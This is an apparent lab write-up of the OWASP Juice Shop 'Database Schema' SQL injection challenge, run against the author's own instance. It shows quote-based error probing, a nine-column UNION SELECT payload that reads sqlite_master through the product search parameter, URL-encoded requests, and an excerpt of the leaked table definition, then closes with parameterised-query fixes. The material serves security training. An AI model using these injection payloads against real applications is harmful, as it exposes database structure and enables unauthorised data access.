---
sidebar_label: 'Challenge: Database Schema'
---

# Challenge: Database Schema

**Category:** Injection · **Difficulty:** 3 stars

## Task

The goal was to retrieve the database schema through SQL injection in my own Juice Shop lab. A schema describes the structure of the database, including its tables and columns.

I investigated the product search because it sends the search text to the server in the `q` parameter. My hypothesis was that this input might become part of a SQL query.

## Tests

I intercepted a product search and sent it to Burp Repeater. I changed the `q` value to find out whether the server treated my input only as search text or also as SQL.

| Test | Observed response | What I learned |
| --- | --- | --- |
| Search for `banana` | `200 OK`, with *Banana Juice* | This was my normal response for comparison. |
| Add a quote: `test'` | `500 Internal Server Error`, with `SQLITE_ERROR` and `name LIKE '%test'%'` | The quote ended the SQL string early. My input affected the query syntax, and the error identified SQLite. |
| Close the string and parentheses: `banana'))--` | `200 OK`, with `data: []` | The query was valid again. The remaining `LIKE '%banana'` pattern would only match names ending in `banana`, which explained the empty result. |
| Add a `UNION SELECT` with nine fixed values, including `Probe` and `Nur ein Test` | `200 OK`, with `name: "Probe"` and `description: "Nur ein Test"` | Nine columns worked, and I could see text from my added query in the response. |

The nine fields in the normal product response gave me a starting point. The successful UNION test confirmed that nine values worked. It returned a test row without saving a product. For background on why the column count matters, see [PortSwigger's explanation of UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).

I sent each of the first three search values as a separate request in Burp Repeater. These are their request lines; headers are omitted:

```http
GET /rest/products/search?q=banana HTTP/1.1
GET /rest/products/search?q=test%27 HTTP/1.1
GET /rest/products/search?q=banana%27%29%29-- HTTP/1.1
```

In a request URL, `%27` represents a quote and `%29` a closing parenthesis.

## Solution

I needed to find where SQLite stores table definitions. The [SQLite SQL injection cheatsheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet) gave me `SELECT sql FROM sqlite_master WHERE type='table'`. I adapted my working nine-column UNION test: I replaced `Probe` with `sql` in the second position and added the table selection after the nine values.

My first attempt put `FROM` after `--`, so the SQL comment hid the part I needed. Moving `FROM sqlite_master WHERE type='table'` before the comment produced this working search value:

```sql
banana')) UNION SELECT 0,sql,'Nur ein Test',0,0,'',NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

The value above is the readable, URL-decoded form of `q`. I used [CyberChef](https://gchq.github.io/CyberChef/) to prepare the URL-encoded form for the request, including its spaces and special characters. I then sent this request in Burp Repeater:

```http
GET /rest/products/search?q=banana%27%29%29%20UNION%20SELECT%200%2Csql%2C%27Nur%20ein%20Test%27%2C0%2C0%2C%27%27%2CNULL%2CNULL%2CNULL%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27-- HTTP/1.1
```

The payload works as follows:

- `banana'))` closes the original string and parentheses.
- `UNION SELECT` adds rows from another query. Both queries must return nine columns here.
- `sql` in the second position places a table definition in the response's `name` field. The other values fill the remaining columns.
- `FROM sqlite_master WHERE type='table'` selects table definitions.
- `--` comments out the rest of the original query.

## Result and Evidence

The response returned `200 OK`. This is an excerpt of its JSON body; the supplied capture stops after `description`:

```text
"status":"success","data":[{"id":0,"name":"CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","description":"Nur ein Test",
```

The `name` field shows one table definition, while `description` still contains my test value. The excerpt does not show the complete schema response. Juice Shop then marked *Database Schema* as solved in my lab.

## Lessons Learned

The search input changed the SQL query instead of remaining plain search text. That let me read a table definition, and the detailed error helped me identify SQLite. I did not test access to other data or changes to stored data.

Search values should be passed as bound SQL parameters so they cannot change the query structure. The application should also return generic errors to clients and keep detailed database errors in protected server logs.

[Back to Juice Shop Master](../README.md)
